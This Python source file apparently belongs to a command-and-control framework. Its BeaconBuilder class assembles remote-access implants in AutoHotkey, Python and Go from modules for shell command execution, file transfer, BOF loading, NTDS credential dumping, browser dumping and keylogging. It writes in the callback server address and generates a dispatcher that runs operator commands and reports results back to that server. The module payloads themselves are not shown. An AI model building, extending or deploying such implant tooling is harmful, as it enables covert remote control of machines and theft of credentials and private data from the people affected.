"""
BeaconBuilder - Main builder class for assembling custom beacons
"""

import os
import re
import yaml
import uuid
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass


@dataclass
class ModuleManifest:
    """Represents a module's manifest configuration"""
    id: str
    version: str
    display_name: str
    description: str
    requires: List[str]
    provides: List[str]
    files: List[str]
    dispatch: Dict[str, str]
    schema: Dict
    config_options: Dict
    path: Path

    @classmethod
    def from_yaml(cls, yaml_data: Dict, path: Path) -> 'ModuleManifest':
        """Create a ModuleManifest from parsed YAML data"""
        module = yaml_data.get('module', {})
        return cls(
            id=module.get('id', ''),
            version=module.get('version', '1.0.0'),
            display_name=module.get('display_name', ''),
            description=module.get('description', ''),
            requires=module.get('requires', []),
            provides=module.get('provides', []),
            files=module.get('files', []),
            dispatch=module.get('dispatch', {}),
            schema=module.get('schema', {}),
            config_options=module.get('config_options', {}),
            path=path
        )


@dataclass
class LanguageConfig:
    """Language-specific syntax configuration for code generation"""
    name: str                      # Display name
    file_extension: str            # e.g., '.py', '.ahk', '.js'
    comment_single: str            # Single-line comment prefix
    comment_multi_start: str       # Multi-line comment start (empty if not supported)
    comment_multi_end: str         # Multi-line comment end
    statement_terminator: str      # e.g., ';' for JS/Go, '' for Python
    string_quote: str              # Preferred quote character
    indent_char: str               # Indentation character(s)
    indent_size: int               # Number of indent_char per level
    class_keyword: str             # Keyword for class definition
    function_keyword: str          # Keyword for function definition
    self_reference: str            # How to reference instance (self, this, etc.)

    def comment(self, text: str) -> str:
        """Create a single-line comment"""
        return f"{self.comment_single} {text}"

    def comment_block(self, text: str) -> str:
        """Create a multi-line comment block"""
        if self.comment_multi_start:
            return f"{self.comment_multi_start}\n{text}\n{self.comment_multi_end}"
        else:
            # Fall back to multiple single-line comments
            lines = text.split('\n')
            return '\n'.join(f"{self.comment_single} {line}" for line in lines)

    def section_header(self, title: str, char: str = '=', width: int = 76) -> str:
        """Create a section header comment"""
        border = char * width
        return f"{self.comment_single} {border}\n{self.comment_single} {title.upper()}\n{self.comment_single} {border}"

    def indent(self, code: str, levels: int = 1) -> str:
        """Indent code by specified number of levels"""
        indent_str = (self.indent_char * self.indent_size) * levels
        lines = code.split('\n')
        return '\n'.join(indent_str + line if line.strip() else line for line in lines)


# Language configuration registry
LANGUAGE_CONFIGS: Dict[str, LanguageConfig] = {
    'ahk': LanguageConfig(
        name='AutoHotkey',
        file_extension='.ahk',
        comment_single=';',
        comment_multi_start='/*',
        comment_multi_end='*/',
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='class',
        function_keyword='',  # AHK uses MethodName() { }
        self_reference='this',
    ),
    'python': LanguageConfig(
        name='Python',
        file_extension='.py',
        comment_single='#',
        comment_multi_start='"""',
        comment_multi_end='"""',
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='class',
        function_keyword='def',
        self_reference='self',
    ),
    'javascript': LanguageConfig(
        name='JavaScript',
        file_extension='.js',
        comment_single='//',
        comment_multi_start='/*',
        comment_multi_end='*/',
        statement_terminator=';',
        string_quote="'",
        indent_char=' ',
        indent_size=2,
        class_keyword='class',
        function_keyword='function',
        self_reference='this',
    ),
    'go': LanguageConfig(
        name='Go',
        file_extension='.go',
        comment_single='//',
        comment_multi_start='/*',
        comment_multi_end='*/',
        statement_terminator='',  # Go has implicit semicolons
        string_quote='"',
        indent_char='\t',
        indent_size=1,
        class_keyword='type',  # Go uses type X struct {}
        function_keyword='func',
        self_reference='',  # Go uses receiver name
    ),
    'lua': LanguageConfig(
        name='Lua',
        file_extension='.lua',
        comment_single='--',
        comment_multi_start='--[[',
        comment_multi_end=']]',
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='',  # Lua uses tables for OOP
        function_keyword='function',
        self_reference='self',
    ),
    'vbs': LanguageConfig(
        name='VBScript',
        file_extension='.vbs',
        comment_single="'",
        comment_multi_start='',  # VBS has no multi-line comments
        comment_multi_end='',
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='Class',
        function_keyword='Function',  # Also Sub for void
        self_reference='Me',
    ),
    'powershell': LanguageConfig(
        name='PowerShell',
        file_extension='.ps1',
        comment_single='#',
        comment_multi_start='<#',
        comment_multi_end='#>',
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='class',
        function_keyword='function',
        self_reference='$this',
    ),
    'bash': LanguageConfig(
        name='Bash',
        file_extension='.sh',
        comment_single='#',
        comment_multi_start=": '",  # Bash multi-line is hacky
        comment_multi_end="'",
        statement_terminator='',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='',  # Bash doesn't have classes
        function_keyword='',  # Bash uses name() { }
        self_reference='',
    ),
}


def get_language_config(language: str) -> LanguageConfig:
    """Get language configuration, with fallback to a sensible default"""
    if language in LANGUAGE_CONFIGS:
        return LANGUAGE_CONFIGS[language]
    # Default to C-style syntax as fallback
    return LanguageConfig(
        name=language.title(),
        file_extension=f'.{language}',
        comment_single='//',
        comment_multi_start='/*',
        comment_multi_end='*/',
        statement_terminator=';',
        string_quote='"',
        indent_char=' ',
        indent_size=4,
        class_keyword='class',
        function_keyword='function',
        self_reference='this',
    )


class BeaconBuilder:
    """
    Main builder class for assembling custom beacons from modular components.

    Usage:
        builder = BeaconBuilder('ahk')
        modules = builder.get_available_modules()
        builder.select_modules(['shell_command', 'file_transfer', 'bof_loader'])
        beacon_code = builder.build({
            'server_ip': '192.168.1.100',
            'server_port': 5074,
            'checkin_interval': 15000
        })
    """

    # Category ordering: meta/management first, then MITRE ATT&CK / Cyber Kill Chain order
    # Categories not in this list will appear at the end in alphabetical order
    CATEGORY_ORDER = [
        # Meta / Management categories (first)
        'basic_commands',
        'management',
        'bof_execution',
        # MITRE ATT&CK / Cyber Kill Chain order
        'reconnaissance',
        'resource_development',
        'initial_access',
        'execution',
        'persistence',
        'privilege_escalation',
        'defense_evasion',
        'evasion',  # Alias for defense_evasion
        'credential_access',
        'discovery',
        'lateral_movement',
        'collection',
        'command_and_control',
        'exfiltration',
        'impact',
    ]

    def __init__(self, language: str):
        self.language = language
        self.base_path = Path(__file__).parent / 'languages' / language
        self.selected_modules: List[str] = []
        self.config: Dict = {}

        # Cache for loaded manifests
        self._core_manifest: Optional[ModuleManifest] = None
        self._module_manifests: Dict[str, ModuleManifest] = {}
        self._helper_manifests: Dict[str, ModuleManifest] = {}

        # Generated schema tracking
        self._schema_filename: str = ""
        self._last_build_id: str = ""

        # Language configuration (cached)
        self._lang_config: Optional[LanguageConfig] = None

        # Load all manifests on init
        self._load_all_manifests()

    @property
    def lang_config(self) -> LanguageConfig:
        """Get language-specific configuration"""
        if self._lang_config is None:
            self._lang_config = get_language_config(self.language)
        return self._lang_config

    def _load_all_manifests(self):
        """Load all manifest files for the language"""
        # Load core manifest
        core_manifest_path = self.base_path / 'core' / 'manifest.yaml'
        if core_manifest_path.exists():
            with open(core_manifest_path, 'r') as f:
                yaml_data = yaml.safe_load(f)
                self._core_manifest = ModuleManifest.from_yaml(
                    yaml_data, self.base_path / 'core'
                )

        # Load module manifests
        modules_path = self.base_path / 'modules'
        if modules_path.exists():
            for module_dir in modules_path.iterdir():
                if module_dir.is_dir():
                    manifest_path = module_dir / 'manifest.yaml'
                    if manifest_path.exists():
                        with open(manifest_path, 'r') as f:
                            yaml_data = yaml.safe_load(f)
                            manifest = ModuleManifest.from_yaml(yaml_data, module_dir)
                            self._module_manifests[manifest.id] = manifest

        # Load helper manifests
        helpers_path = self.base_path / 'helpers'
        if helpers_path.exists():
            for helper_dir in helpers_path.iterdir():
                if helper_dir.is_dir():
                    manifest_path = helper_dir / 'manifest.yaml'
                    if manifest_path.exists():
                        with open(manifest_path, 'r') as f:
                            yaml_data = yaml.safe_load(f)
                            manifest = ModuleManifest.from_yaml(yaml_data, helper_dir)
                            self._helper_manifests[manifest.id] = manifest

    def get_available_modules(self) -> List[ModuleManifest]:
        """Return all available optional modules for UI selection"""
        return list(self._module_manifests.values())

    def get_available_helpers(self) -> List[ModuleManifest]:
        """Return all available helper modules"""
        return list(self._helper_manifests.values())

    def get_module(self, module_id: str) -> Optional[ModuleManifest]:
        """Get a specific module by ID"""
        return self._module_manifests.get(module_id)

    def get_helper(self, helper_id: str) -> Optional[ModuleManifest]:
        """Get a specific helper by ID"""
        return self._helper_manifests.get(helper_id)

    def select_modules(self, module_ids: List[str]):
        """Select which modules to include in the beacon"""
        self.selected_modules = module_ids

    def resolve_dependencies(self) -> List[ModuleManifest]:
        """
        Resolve all dependencies and return modules in correct order.
        Uses topological sort to ensure dependencies come before dependents.
        """
        # Start with selected modules
        to_process = set(self.selected_modules)
        resolved: List[ModuleManifest] = []
        resolved_ids: Set[str] = set()

        # Recursively add dependencies
        while to_process:
            module_id = to_process.pop()

            if module_id in resolved_ids:
                continue

            # Find the manifest
            manifest = None
            if module_id in self._module_manifests:
                manifest = self._module_manifests[module_id]
            elif module_id in self._helper_manifests:
                manifest = self._helper_manifests[module_id]

            if not manifest:
                continue

            # Check if all dependencies are resolved
            deps_resolved = True
            for dep in manifest.requires:
                if dep not in resolved_ids:
                    deps_resolved = False
                    to_process.add(dep)

            if deps_resolved:
                resolved.append(manifest)
                resolved_ids.add(module_id)
            else:
                # Put back and process deps first
                to_process.add(module_id)

        return resolved

    def _read_file(self, filepath: Path) -> str:
        """Read a code file and return its contents"""
        if filepath.exists():
            with open(filepath, 'r', encoding='utf-8') as f:
                return f.read()
        return ''

    def _load_module_code(self, manifest: ModuleManifest, exclude_files: List[str] = None) -> str:
        """Load all code files for a module, optionally excluding some files"""
        exclude_files = exclude_files or []
        code_parts = []

        for filename in manifest.files:
            if filename in exclude_files:
                continue
            filepath = manifest.path / filename
            code = self._read_file(filepath)
            if code:
                code_parts.append(self.lang_config.comment(f"--- {filename} ---"))
                code_parts.append(code)
        return '\n'.join(code_parts)

    def _indent_code(self, code: str, spaces: int = 4) -> str:
        """Indent all lines of code by specified number of spaces"""
        indent = ' ' * spaces
        lines = code.split('\n')
        return '\n'.join(indent + line if line.strip() else line for line in lines)

    def _indented_section_header(self, title: str, indent_spaces: int = 4, char: str = '=', width: int = 72) -> str:
        """Generate an indented section header comment"""
        indent = ' ' * indent_spaces
        border = char * width
        c = self.lang_config.comment_single
        return f"{indent}{c} {border}\n{indent}{c} {title.upper()}\n{indent}{c} {border}"

    def _extract_method_body(self, code: str) -> str:
        """
        Extract method code and ensure proper indentation for class inclusion.
        Removes file-level comments but keeps the function definitions.
        """
        lines = code.split('\n')
        result_lines = []
        in_header_comments = True

        for line in lines:
            # Skip file-level header comments at the start
            if in_header_comments:
                stripped = line.strip()
                if stripped.startswith(';') and ('===' in stripped or 'MODULE' in stripped.upper()):
                    continue
                if stripped == '':
                    continue
                if stripped.startswith('; These methods should be added'):
                    continue
                in_header_comments = False

            result_lines.append(line)

        return '\n'.join(result_lines)

    def _filter_out_execute_module(self, code: str) -> str:
        """
        Filter out the ExecuteModule function from code since we generate it dynamically.
        """
        lines = code.split('\n')
        result_lines = []
        skip_until_next_function = False
        brace_count = 0

        for line in lines:
            stripped = line.strip()

            # Check if this is the start of ExecuteModule
            if 'ExecuteModule(module, parameters)' in stripped or stripped.startswith('ExecuteModule('):
                skip_until_next_function = True
                # Count the opening brace on this line
                brace_count = stripped.count('{') - stripped.count('}')
                continue

            if skip_until_next_function:
                # Count braces to find end of function
                brace_count += stripped.count('{')
                brace_count -= stripped.count('}')
                if brace_count <= 0 and '}' in stripped:
                    skip_until_next_function = False
                continue

            result_lines.append(line)

        return '\n'.join(result_lines)

    def _extract_execute_bof_only(self, code: str) -> str:
        """
        Extract only the ExecuteBOF function from integration.ahk, skipping ExecuteModule.
        """
        lines = code.split('\n')
        result_lines = []
        in_execute_bof = False
        brace_count = 0
        skip_execute_module = False

        for line in lines:
            stripped = line.strip()

            # Skip file-level comments
            if stripped.startswith(';') and ('===' in stripped or 'MODULE' in stripped.upper() or 'NetworkClient' in stripped):
                continue

            # Skip ExecuteModule function
            if 'ExecuteModule(module, parameters)' in stripped or stripped.startswith('ExecuteModule('):
                skip_execute_module = True
                # Count the opening brace on this line
                brace_count = stripped.count('{') - stripped.count('}')
                continue

            if skip_execute_module:
                brace_count += stripped.count('{')
                brace_count -= stripped.count('}')
                if brace_count <= 0 and '}' in stripped:
                    skip_execute_module = False
                continue

            # Capture ExecuteBOF function
            if 'ExecuteBOF(parameters)' in stripped or stripped.startswith('ExecuteBOF('):
                in_execute_bof = True
                brace_count = 0

            if in_execute_bof or (not stripped.startswith(';') and stripped):
                result_lines.append(line)
                if in_execute_bof:
                    brace_count += stripped.count('{')
                    brace_count -= stripped.count('}')
                    if brace_count <= 0 and '}' in stripped and brace_count == 0:
                        # Check if this is the closing brace of ExecuteBOF
                        if stripped == '}':
                            in_execute_bof = False

        return '\n'.join(result_lines)

    def _generate_execute_module_handler(self, resolved_modules: List[ModuleManifest]) -> str:
        """
        Generate a dynamic ExecuteModule handler based on selected modules.
        Each module's manifest defines which dispatch cases it provides.
        Note: Currently generates AHK-specific code.
        """
        # Collect all dispatch entries from selected modules with their manifests
        dispatch_cases = []

        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                continue  # Helpers don't have dispatch cases

            for case_name, method_name in manifest.dispatch.items():
                dispatch_cases.append((case_name, method_name, manifest))

        # Generate the ExecuteModule method
        c = self.lang_config.comment_single
        handler_lines = [
            f"{c} Execute a module by name with parameters",
            "ExecuteModule(module, parameters) {",
            "    try {",
            "        switch module {"
        ]

        # Add cases for each module dispatch
        for case_name, method_name, manifest in dispatch_cases:
            # Handle different parameter patterns
            if case_name in ['bof', 'execute_bof']:
                handler_lines.append(f'            case "{case_name}":')
                handler_lines.append(f'                return this.ExecuteBOF(parameters)')
            elif method_name == 'HandleCommand':
                handler_lines.append(f'            case "{case_name}":')
                handler_lines.append(f'                return this.HandleCommand(parameters)')
            elif method_name == 'HandleFileDownload':
                handler_lines.append(f'            case "{case_name}":')
                handler_lines.append(f'                return this.HandleFileDownload(parameters)')
            elif method_name == 'HandleFileUpload':
                handler_lines.append(f'            case "{case_name}":')
                handler_lines.append(f'                return this.HandleFileUpload(parameters)')
            else:
                # Check if module has parameters in its schema
                has_parameters = False
                if manifest.schema and 'modules' in manifest.schema:
                    for mod_id, mod_schema in manifest.schema['modules'].items():
                        if mod_schema.get('parameters'):
                            has_parameters = True
                            break

                handler_lines.append(f'            case "{case_name}":')
                if has_parameters:
                    # Module has parameters - pass them
                    handler_lines.append(f'                return this.{method_name}(parameters)')
                else:
                    # Module has no parameters - call without arguments
                    handler_lines.append(f'                return this.{method_name}()')

        # Add default case
        handler_lines.extend([
            '            default:',
            '                this.Log("Unknown module: " module)',
            '                message := Format("command_output|{}|Module not found: {}", this.agentID, module)',
            '                this.SendMsg(this.serverIP, this.serverPort, message)',
            '                return false',
            '        }',
            '    } catch as err {',
            '        this.Log("Module execution failed: " err.Message)',
            '        message := Format("command_output|{}|Module Error: {}", this.agentID, err.Message)',
            '        this.SendMsg(this.serverIP, this.serverPort, message)',
            '        return false',
            '    }',
            '}'
        ])

        return '\n'.join(handler_lines)

    def build(self, config: Dict) -> str:
        """
        Generate the final beacon code.

        Args:
            config: Configuration dict with keys like 'server_ip', 'server_port', etc.

        Returns:
            Complete beacon source code as a string
        """
        self.config = config

        # Generate unique build ID and schema filename
        self._last_build_id = self._generate_build_id()
        self._schema_filename = self._generate_schema_filename(self._last_build_id)

        # Route to language-specific builder
        if self.language == 'python':
            return self._build_python_beacon(config)
        elif self.language == 'go':
            return self._build_go_beacon(config)
        else:
            return self._build_ahk_beacon(config)

    def _build_ahk_beacon(self, config: Dict) -> str:
        """Build AutoHotkey beacon"""
        # Resolve dependencies
        resolved_modules = self.resolve_dependencies()

        # Build code sections
        code_sections = []

        # 1. Add header with configuration
        header_code = self._read_file(self.base_path / 'core' / 'header.ahk')
        header_code = self._substitute_config(header_code, config)
        code_sections.append(header_code)

        # 2. Add logging function (standalone)
        logging_code = self._read_file(self.base_path / 'core' / 'logging.ahk')
        code_sections.append(logging_code)

        # 3. Add helper functions (standalone - like Base64)
        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                code_sections.append(self.lang_config.section_header(f"HELPER: {manifest.display_name}"))
                code_sections.append(self._load_module_code(manifest))

        # 4. Add BOF loader classes (standalone classes - NOT methods)
        if 'bof_loader' in self.selected_modules:
            bof_manifest = self._module_manifests.get('bof_loader')
            if bof_manifest:
                code_sections.append(self.lang_config.section_header("BOF LOADER CLASSES"))
                # Load all BOF files EXCEPT integration.ahk (which contains class methods)
                code_sections.append(self._load_module_code(bof_manifest, exclude_files=['integration.ahk']))

        # 4b. Add NTDS dump classes (standalone classes - NOT methods)
        if 'ntds_dump' in self.selected_modules:
            ntds_manifest = self._module_manifests.get('ntds_dump')
            if ntds_manifest:
                code_sections.append(self.lang_config.section_header("NTDS DUMP CLASSES"))
                # Load only classes.ahk (standalone classes), code.ahk contains methods
                code_sections.append(self._read_file(ntds_manifest.path / 'classes.ahk'))

        # 5. Build the NetworkClient class with all methods inside
        network_class = self._build_network_client_class(resolved_modules)
        code_sections.append(network_class)

        # 6. Add main entry point
        main_code = self._read_file(self.base_path / 'core' / 'main.ahk')
        code_sections.append(main_code)

        # Join all sections
        final_code = '\n\n'.join(code_sections)

        return final_code

    def _build_python_beacon(self, config: Dict) -> str:
        """Build Python beacon by assembling modules"""
        # Resolve dependencies
        resolved_modules = self.resolve_dependencies()

        code_sections = []

        # 1. Header (imports + config placeholders)
        header_code = self._read_file(self.base_path / 'core' / 'header.py')
        header_code = self._substitute_config(header_code, config)
        code_sections.append(header_code)

        # 2. Logging function
        logging_code = self._read_file(self.base_path / 'core' / 'logging.py')
        code_sections.append(logging_code)

        # 3. Build the PythonBeacon class with all methods
        beacon_class = self._build_python_beacon_class(resolved_modules, config)
        code_sections.append(beacon_class)

        # 4. Main entry point
        main_code = self._read_file(self.base_path / 'core' / 'main.py')
        code_sections.append(main_code)

        # Join all sections
        final_code = '\n\n'.join(code_sections)

        return final_code

    def _build_python_beacon_class(self, resolved_modules: List[ModuleManifest], config: Dict) -> str:
        """Build the complete PythonBeacon class with all methods"""
        class_parts = []

        # Start with network_base.py content (class definition and core methods)
        network_base = self._read_file(self.base_path / 'core' / 'network_base.py')
        network_base = self._substitute_config(network_base, config)

        # Find where the class ends - we need to insert methods before the end
        # Python class doesn't have explicit closing brace, so we need to track indentation
        lines = network_base.split('\n')

        # Find the last non-empty line that's at class level (4 spaces or less after class start)
        class_started = False
        last_method_end = len(lines)

        for i, line in enumerate(lines):
            if 'class PythonBeacon' in line:
                class_started = True
            if class_started and line.strip() and not line.startswith('    ') and not line.startswith('class'):
                # Found something at module level after class started - class ended
                last_method_end = i
                break

        # Keep the class definition and all its methods
        class_parts.append('\n'.join(lines[:last_method_end]))

        # Add registration methods
        registration_code = self._read_file(self.base_path / 'core' / 'registration.py')
        if registration_code:
            class_parts.append("")
            class_parts.append(self._indented_section_header("REGISTRATION METHODS"))
            class_parts.append(registration_code)

        # Add check-in methods
        checkin_code = self._read_file(self.base_path / 'core' / 'checkin.py')
        if checkin_code:
            class_parts.append("")
            class_parts.append(self._indented_section_header("CHECK-IN METHODS"))
            class_parts.append(checkin_code)

        # Add module methods
        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                continue  # Helpers are standalone functions for Python too

            # Load module code
            module_code = self._load_module_code(manifest)
            if module_code and module_code.strip():
                class_parts.append("")
                class_parts.append(self._indented_section_header(f"{manifest.display_name} METHODS"))
                class_parts.append(module_code)

        # Add any remaining code after the class (if any)
        if last_method_end < len(lines):
            remaining = '\n'.join(lines[last_method_end:])
            if remaining.strip():
                class_parts.append(remaining)

        return '\n'.join(class_parts)

    def _build_go_beacon(self, config: Dict) -> str:
        """Build Go beacon by assembling modules"""
        resolved_modules = self.resolve_dependencies()
        code_sections = []

        # 1. Header (package, imports, config)
        header = self._read_file(self.base_path / 'core' / 'header.go')
        header = self._substitute_config(header, config)
        code_sections.append(header)

        # 2. Types (GoBeacon struct)
        types_code = self._read_file(self.base_path / 'core' / 'types.go')
        code_sections.append(types_code)

        # 3. Core methods (network, registration, checkin)
        for core_file in ['network.go', 'registration.go', 'checkin.go']:
            core_code = self._read_file(self.base_path / 'core' / core_file)
            if core_code:
                code_sections.append(core_code)

        # 4. Module methods
        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                continue  # Helpers are standalone in Go too

            module_code = self._load_module_code(manifest)
            if module_code and module_code.strip():
                code_sections.append(self.lang_config.section_header(f"{manifest.display_name} MODULE"))
                code_sections.append(module_code)

        # 5. Generate executeModule dispatcher
        dispatcher = self._generate_go_dispatcher(resolved_modules)
        code_sections.append(dispatcher)

        # 6. Main entry point
        main_code = self._read_file(self.base_path / 'core' / 'main.go')
        code_sections.append(main_code)

        return '\n\n'.join(filter(None, code_sections))

    def _generate_go_dispatcher(self, resolved_modules: List[ModuleManifest]) -> str:
        """Generate Go switch-based command dispatcher"""
        cases = []

        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                continue

            for cmd, method in manifest.dispatch.items():
                cases.append(f'\tcase "{cmd}":\n\t\treturn b.{method}(parameters)')

        cases_str = '\n'.join(cases)

        return f'''// ExecuteModule dispatches commands to module methods
func (b *GoBeacon) executeModule(module, parameters string) string {{
\tb.Logger.Printf("Executing module: %s with parameters: %s", module, parameters)

\tswitch module {{
{cases_str}
\tdefault:
\t\treturn fmt.Sprintf("Unknown module: %s", module)
\t}}
}}'''

    def _build_network_client_class(self, resolved_modules: List[ModuleManifest]) -> str:
        """
        Build the complete NetworkClient class with all methods properly inside.
        """
        class_parts = []

        # Start with network_base.ahk content (class definition and core methods)
        network_base = self._read_file(self.base_path / 'core' / 'network_base.ahk')
        # Apply config substitutions (including schema_filename)
        network_base = self._substitute_config(network_base, self.config)

        # Find where the class ends (last closing brace)
        # We need to insert additional methods before the final }
        lines = network_base.split('\n')

        # Find the last closing brace that ends the class
        last_brace_index = -1
        brace_count = 0
        in_class = False

        for i, line in enumerate(lines):
            stripped = line.strip()
            if 'class NetworkClient' in line:
                in_class = True
            if in_class:
                brace_count += stripped.count('{')
                brace_count -= stripped.count('}')
                if brace_count == 0 and '}' in stripped:
                    last_brace_index = i
                    break

        if last_brace_index == -1:
            # Fallback: just append to the end
            class_parts.append(network_base)
        else:
            # Insert methods before the closing brace
            class_parts.append('\n'.join(lines[:last_brace_index]))

        # Add registration methods (indented as class methods)
        registration_code = self._read_file(self.base_path / 'core' / 'registration.ahk')
        if registration_code:
            class_parts.append("")
            class_parts.append(self._indented_section_header("REGISTRATION METHODS"))
            class_parts.append(self._indent_code(self._extract_method_body(registration_code), 4))

        # Add check-in methods (indented as class methods)
        checkin_code = self._read_file(self.base_path / 'core' / 'checkin.ahk')
        if checkin_code:
            class_parts.append("")
            class_parts.append(self._indented_section_header("CHECK-IN METHODS"))
            class_parts.append(self._indent_code(self._extract_method_body(checkin_code), 4))

        # Add module methods (shell_command, file_transfer, etc.)
        # But skip ExecuteModule since we'll generate it dynamically
        for manifest in resolved_modules:
            if manifest.id.startswith('helpers.'):
                continue  # Helpers are standalone functions
            if manifest.id == 'bof_loader':
                # For BOF, only add ExecuteBOF method (not ExecuteModule)
                integration_code = self._read_file(manifest.path / 'integration.ahk')
                if integration_code:
                    # Extract only ExecuteBOF, not ExecuteModule
                    bof_code = self._extract_execute_bof_only(integration_code)
                    if bof_code:
                        class_parts.append("")
                        class_parts.append(self._indented_section_header("BOF EXECUTION METHODS"))
                        class_parts.append(self._indent_code(bof_code, 4))
            elif manifest.id == 'ntds_dump':
                # For NTDS dump, only add code.ahk (NTDSDump method), classes are standalone
                ntds_code = self._read_file(manifest.path / 'code.ahk')
                if ntds_code:
                    filtered_code = self._filter_out_execute_module(ntds_code)
                    if filtered_code.strip():
                        class_parts.append("")
                        class_parts.append(self._indented_section_header("NTDS DUMP METHODS"))
                        class_parts.append(self._indent_code(self._extract_method_body(filtered_code), 4))
            else:
                # Regular modules (shell_command, file_transfer, browser_dump)
                # Skip the default ExecuteModule function since we generate it dynamically
                module_code = self._load_module_code(manifest)
                if module_code:
                    # Filter out ExecuteModule if present
                    filtered_code = self._filter_out_execute_module(module_code)
                    if filtered_code.strip():
                        class_parts.append("")
                        class_parts.append(self._indented_section_header(f"{manifest.display_name} METHODS"))
                        class_parts.append(self._indent_code(self._extract_method_body(filtered_code), 4))

        # Add dynamically generated ExecuteModule handler
        execute_module_handler = self._generate_execute_module_handler(resolved_modules)
        if execute_module_handler:
            class_parts.append("")
            class_parts.append(self._indented_section_header("MODULE DISPATCHER (Auto-Generated)"))
            class_parts.append(self._indent_code(execute_module_handler, 4))

        # Close the class
        class_parts.append("}")

        return '\n'.join(class_parts)

    def _generate_build_id(self) -> str:
        """Generate a unique build ID based on timestamp and random component"""
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        random_part = uuid.uuid4().hex[:8]
        return f"{timestamp}_{random_part}"

    def _generate_schema_filename(self, build_id: str) -> str:
        """Generate a unique schema filename for this build"""
        return f"custom_{build_id}.yaml"

    def get_schema_filename(self) -> str:
        """Get the generated schema filename for the last build"""
        return self._schema_filename

    def _substitute_config(self, code: str, config: Dict) -> str:
        """Replace configuration placeholders in code"""
        replacements = {
            '{{server_ip}}': str(config.get('server_ip', '127.0.0.1')),
            '{{server_port}}': str(config.get('server_port', 5074)),
            '{{checkin_interval}}': str(config.get('checkin_interval', 15000)),
            '{{schema_filename}}': self._schema_filename,
            '{{default_protocol}}': str(config.get('default_protocol', 'tcp')),
        }

        for placeholder, value in replacements.items():
            code = code.replace(placeholder, value)

        return code

    def generate_schema(self) -> Dict:
        """
        Generate a combined YAML schema for selected modules.

        The schema format matches what schema_service.py expects:
        - categories is a dict keyed by category_id
        - modules is a dict keyed by module_id
        - parameters is a dict keyed by param_id

        Returns:
            Schema dictionary ready for YAML serialization
        """
        # Build base schema matching beacon_schema_format.yaml
        schema = {
            'schema_version': '1.1',
            'beacon_info': {
                'beacon_type': f'{self.language}_custom',
                'version': '1.0.0',
                'description': f'Custom {self.language.upper()} beacon with selected modules',
                'supported_platforms': 'windows',
                'encoding_strategy': 'plain',
                'file_transfer_supported': 'file_transfer' in self.selected_modules,
                'keylogger_supported': 'keylogger' in self.selected_modules,
            },
            'categories': {}  # Dict, not list
        }

        # Resolve modules and add their schema contributions
        resolved = self.resolve_dependencies()

        # Modules that have dedicated tabs and should NOT appear in the command widget modules list
        # - keylogger: handled by Keylogger tab when keylogger_supported=true
        # - file_transfer: handled by File Transfer tab when file_transfer_supported=true
        tab_handled_modules = {'keylogger', 'file_transfer'}

        for manifest in resolved:
            # Skip modules that are handled by dedicated tabs
            if manifest.id in tab_handled_modules:
                continue

            if manifest.schema and manifest.schema.get('modules'):
                category_id = manifest.schema.get('category_id', manifest.id)
                category_name = manifest.schema.get('category_name', manifest.display_name)

                # Create category if it doesn't exist
                if category_id not in schema['categories']:
                    schema['categories'][category_id] = {
                        'display_name': category_name,
                        'description': f'{category_name} capabilities',
                        'modules': {}  # Dict, not list
                    }

                # Add modules to the category
                for mod_id, mod_schema in manifest.schema.get('modules', {}).items():
                    module_entry = {
                        'display_name': mod_schema.get('display_name', mod_id),
                        'description': mod_schema.get('description', ''),
                        'command_template': mod_schema.get('command_template', ''),
                        'parameters': {}  # Dict, not list
                    }

                    # Add parameters as dict, preserving all fields
                    for param_id, param_schema in mod_schema.get('parameters', {}).items():
                        # Copy all parameter fields from the manifest
                        param_entry = dict(param_schema)
                        # Ensure required fields have defaults
                        if 'type' not in param_entry:
                            param_entry['type'] = 'text'
                        if 'display_name' not in param_entry:
                            param_entry['display_name'] = param_id
                        if 'required' not in param_entry:
                            param_entry['required'] = False

                        module_entry['parameters'][param_id] = param_entry

                    # Copy additional module-level fields (documentation, execution, ui, etc.)
                    for key in ['documentation', 'execution', 'ui']:
                        if key in mod_schema:
                            module_entry[key] = mod_schema[key]

                    schema['categories'][category_id]['modules'][mod_id] = module_entry

        # Sort categories according to CATEGORY_ORDER
        schema['categories'] = self._sort_categories(schema['categories'])

        return schema

    def _sort_categories(self, categories: Dict) -> Dict:
        """
        Sort categories according to CATEGORY_ORDER.

        Categories in CATEGORY_ORDER appear first in that order.
        Categories not in CATEGORY_ORDER appear at the end in alphabetical order.
        """
        def get_sort_key(category_id: str) -> Tuple[int, str]:
            """Return a sort key tuple (order_index, category_id)"""
            try:
                # Categories in CATEGORY_ORDER get their index
                index = self.CATEGORY_ORDER.index(category_id)
                return (index, category_id)
            except ValueError:
                # Categories not in list go to the end, sorted alphabetically
                return (len(self.CATEGORY_ORDER), category_id)

        # Sort category IDs
        sorted_category_ids = sorted(categories.keys(), key=get_sort_key)

        # Build new ordered dict
        sorted_categories = {}
        for category_id in sorted_category_ids:
            sorted_categories[category_id] = categories[category_id]

        return sorted_categories

    def get_estimated_size(self) -> int:
        """Estimate the size of the generated beacon in bytes"""
        # Quick estimate based on selected modules
        sizes = {
            'core': 8000,
            'shell_command': 1000,
            'file_transfer': 5000,
            'bof_loader': 40000,
            'helpers.base64': 1500,
        }

        total = sizes['core']  # Core is always included

        resolved = self.resolve_dependencies()
        for manifest in resolved:
            total += sizes.get(manifest.id, 2000)

        return total


def get_supported_languages() -> List[str]:
    """Return list of supported beacon languages"""
    languages_path = Path(__file__).parent / 'languages'
    if languages_path.exists():
        return [d.name for d in languages_path.iterdir() if d.is_dir()]
    return []
